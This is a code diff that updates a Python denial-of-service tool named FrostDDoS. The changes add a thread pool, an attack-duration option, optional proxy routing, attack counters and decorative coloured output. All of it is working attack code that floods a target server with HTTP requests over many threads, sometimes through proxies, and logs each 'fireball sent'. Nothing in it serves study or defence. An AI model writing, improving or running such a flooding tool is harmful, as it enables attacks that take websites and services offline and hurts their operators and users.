@@ -1,34 +1,32 @@
 import shutil
-from queue import Queue
-from argparse import ArgumentParser
-import time
 import sys
+import time
 import socket
 import threading
-import logging
 import random
+from argparse import ArgumentParser
+from concurrent.futures import ThreadPoolExecutor
 import requests
 
+# Generate a random color code
+def random_color():
+    return f"\033[38;2;{random.randint(0, 255)};{random.randint(0, 255)};{random.randint(0, 255)}m"
+
+# Print text centered with random color
 def print_centered(text, scale=1):
     terminal_width = shutil.get_terminal_size().columns
     scaled_width = terminal_width // scale
     for line in text.split('\n'):
         left_padding = (scaled_width - len(line)) // 2
-        print(" " * left_padding + line)
+        print(random_color() + " " * left_padding + line + "\033[0m")
 
-def print_red_gradient(text):
-    gradient_colors = [(255, 0, 0), (255, 50, 50), (255, 100, 100), (255, 150, 150), (255, 200, 200)]
-    for i, char in enumerate(text):
-        r, g, b = gradient_colors[min(i, len(gradient_colors) - 1)]
-        print(f"\x1b[38;2;{r};{g};{b}m{char}\x1b[0m", end="")
-
-ascii_art = ''' 
-                                             
+# ASCII art with multiple colors
+ascii_art_lines = ''' 
  _____             _   ____  ____      _____ 
 |   __|___ ___ ___| |_|    \|    \ ___|   __|
 |   __|  _| . |_ -|  _|  |  |  |  | . |__   |
 |__|  |_| |___|___|_| |____/|____/|___|_____|
-                                             
+
 '''
 
 text = "Coded By FrostFoe"
@@ -37,65 +35,89 @@ text = "Coded By FrostFoe"
 terminal_width = shutil.get_terminal_size().columns
 scale = max(1, terminal_width // 80)
 
-print_centered(ascii_art, scale=scale)
+# Adding random color to ASCII art and text
+for line in ascii_art_lines.split('\n'):
+    print_centered(line, scale=scale)
 print_centered(text, scale=scale)
 
-def print_centered(text, scale=1):
-    terminal_width = shutil.get_terminal_size().columns
-    scaled_width = terminal_width // scale
-    for line in text.split('\n'):
-        left_padding = (scaled_width - len(line)) // 2
-        print(" " * left_padding + line)
-
+# Get a random user agent
 def user_agent():
-    # Dynamically select a random user agent for each request
-    uagent = requests.utils.default_user_agent()
-    return uagent
+    return requests.utils.default_user_agent()
 
-dragon_counter = 0  # Counter to keep track of dragons throwing fireballs
+# Initialize counters and locks
+successful_attacks = 0
+failed_attacks = 0
+counter_lock = threading.Lock()
 
-def down_it(proxy, host, preference):
-    global dragon_counter
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((proxy.split(':')[0], int(proxy.split(':')[1])))
-            packet = f"GET / HTTP/1.1\nHost: {host}\n\n User-Agent: {user_agent()}\nX-Preference: {preference}\n".encode('utf-8')
-            if s.sendto(packet, (proxy.split(':')[0], int(proxy.split(':')[1]))):
-                s.shutdown(1)
-                dragon_counter += 1  # Increment the counter
-                if dragon_counter in [1, 3, 4]:  # Check if it's the first, third, or fourth dragon
-                    print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--Fireball sent! The ancient dragon breathes fire at its foe...🐲🔥💥\033[0m")
-                else:
-                    print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--Fireball sent! Another dragon joins the fray, hurling fireballs!🐉🔥💥\033[0m")
-            else:
-                s.shutdown(1)
-                print("\033[91mConnection shut down\033[0m")
-        except:
-            pass
+# List of dragon names
+dragon_names = [
+    "Smaug", "Draco", "Toothless"
+]
 
-def dos(proxy_list, host, port, thr, preference):
-    while True:
-        for proxy in proxy_list:
-            threading.Thread(target=down_it, args=(proxy, host, preference)).start()
+# Function to handle attacks
+def attack(host, port, preference, duration, proxy=None):
+    global successful_attacks, failed_attacks
+    end_time = time.time() + duration
+    try:
+        if proxy:
+            proxy_host, proxy_port = proxy.split(':')
+            with socket.create_connection((proxy_host, int(proxy_port))) as conn:
+                conn.settimeout(1)
+                while time.time() < end_time:
+                    packet = f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {user_agent()}\nX-Preference: {preference}\n".encode('utf-8')
+                    conn.sendall(packet)
+                    with counter_lock:
+                        successful_attacks += 1
+                    dragon_name = random.choice(dragon_names)
+                    print(f"{random_color()}{time.ctime(time.time())}\033[0m {random_color()} <--Fireball sent by {dragon_name}!🐲🔥💥 (Successful Attacks: {successful_attacks})\033[0m")
+        else:
+            with socket.create_connection((host, port)) as conn:
+                conn.settimeout(1)
+                while time.time() < end_time:
+                    packet = f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {user_agent()}\nX-Preference: {preference}\n".encode('utf-8')
+                    conn.sendall(packet)
+                    with counter_lock:
+                        successful_attacks += 1
+                    dragon_name = random.choice(dragon_names)
+                    print(f"{random_color()}{time.ctime(time.time())}\033[0m {random_color()} <--Fireball sent by {dragon_name}!🐲🔥💥 (Successful Attacks: {successful_attacks})\033[0m")
+    except Exception as e:
+        with counter_lock:
+            failed_attacks += 1
+        print(f"\033[91mError attacking {host}:{port} - {e}\033[0m")
 
+# Main DoS function
+def dos(host, port, thr, preference, duration, proxy_list=None):
+    with ThreadPoolExecutor(max_workers=thr) as executor:
+        if proxy_list:
+            for proxy in proxy_list:
+                executor.submit(attack, host, port, preference, duration, proxy)
+        else:
+            for _ in range(thr):
+                executor.submit(attack, host, port, preference, duration)
+
+# Print usage information
 def usage():
     print('''\033[91mFrostDDoS - Coded by FrostFoe
 
-    Usage: python3 FrostDDoS.py [-h] [-s HOST] [-p PORT] [-t TURBO]
+    Usage: python3 FrostDDoS.py [-h] [-s HOST] [-p PORT] [-t TURBO] [-d DURATION] [--proxy PROXY_FILE]
     -h : You Dare Ask for Help?!
     -s : Server IP to Incinerate Under the Dragon's Wrath
     -p : Port (default 80)
-    -t : Turbo (default 300, but You Want Faster? I'll Give You Faster!) 
-    -pref : FrostFoe's preference (default high)\033[0m''')
+    -t : Turbo (default 300)
+    -d : Duration of attack in seconds (default 60)
+    -pref : FrostFoe's preference (default high)
+    --proxy : Optional proxy file\033[0m''')
     sys.exit()
 
+# Parse command line arguments
 def get_parameters():
     parser = ArgumentParser(description="FrostDDoS - Coded by FrostFoe")
     parser.add_argument("-s", "--server", dest="host", required=True, help="Attack to server IP -s IP")
     parser.add_argument("-p", "--port", type=int, dest="port", default=80, help="Port (default 80)")
     parser.add_argument("-t", "--turbo", type=int, dest="turbo", default=300, help="Turbo (default 300)")
+    parser.add_argument("-d", "--duration", type=int, dest="duration", default=60, help="Duration of attack in seconds (default 60)")
     parser.add_argument("-pref", "--preference", dest="preference", default="high", help="FrostFoe's preference (default high)")
+    parser.add_argument("--proxy", dest="proxy_file", help="Optional proxy file")
     args = parser.parse_args()
     return args
 
@@ -103,21 +125,41 @@ if __name__ == '__main__':
     args = get_parameters()
     host = args.host
     port = args.port
-    thr = args.turbo * 500
+    thr = args.turbo * 10  # Increased turbo to send 10 times more packets
     preference = args.preference
-    print("\033[92m", host, "Port: ", str(port), "Turbo: ", str(thr), "\033[0m")
-    print("\033[94mLet the Dragon's Wrath begin...🔥🐉💥🌋\033[0m")
-    print(f"\033[94mFrostFoe's preference: {preference}\033[0m")
+    duration = args.duration
+    proxy_file = args.proxy_file
+
+    print(f"{random_color()}", host, "Port: ", str(port), "Turbo: ", str(thr), "Duration: ", str(duration), "\033[0m")
+    print(f"{random_color()}Let the Dragon's Wrath begin...🔥🐉💥🌋\033[0m")
+    print(f"{random_color()}FrostFoe's preference: {preference}\033[0m")
+
     proxy_list = []
-    with open('proxy.txt', 'r') as proxy_file:
-        proxy_list = [line.strip() for line in proxy_file.readlines()]
+    if proxy_file:
+        with open(proxy_file, 'r') as f:
+            proxy_list = [line.strip() for line in f.readlines()]
+        print(f"{random_color()}Using proxies from {proxy_file}\033[0m")
+    else:
+        print(f"{random_color()}No proxies specified, proceeding without proxies\033[0m")
+
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host, int(port)))
-        s.settimeout(1)
-    except:
-        print("\033[91mCheck server IP and port\033[0m")
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((host, int(port)))
+            s.settimeout(1)
+    except Exception as e:
+        print(f"\033[91mCheck server IP and port: {e}\033[0m")
         sys.exit()
-    while True:
-        for i in range(int(thr)):
-            threading.Thread(target=dos, args=(proxy_list, host, port, thr, preference)).start()
+
+    # Attack start message with countdown
+    for i in range(3, 0, -1):
+        print(f"{random_color()}Starting attack in {i}...\033[0m")
+        time.sleep(1)
+    print(f"{random_color()}Attack started!\033[0m")
+
+    # Start the DoS attack
+    threading.Thread(target=dos, args=(host, port, thr, preference, duration, proxy_list if proxy_list else None)).start()
+
+    # Wait for the attack to finish
+    time.sleep(duration)
+
+    print(f"{random_color()}Attack ended. Total successful attacks: {successful_attacks}, Total failed attacks: {failed_attacks}\033[0m")
